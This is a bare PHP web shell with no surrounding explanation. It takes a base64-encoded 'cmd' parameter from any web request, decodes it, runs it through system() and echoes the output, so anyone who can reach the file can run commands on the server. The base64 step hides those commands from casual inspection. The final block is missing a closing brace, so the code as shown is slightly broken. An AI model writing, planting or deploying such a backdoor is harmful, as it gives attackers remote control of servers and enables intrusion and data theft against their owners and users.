<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		return $s_out;
	}
}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
?>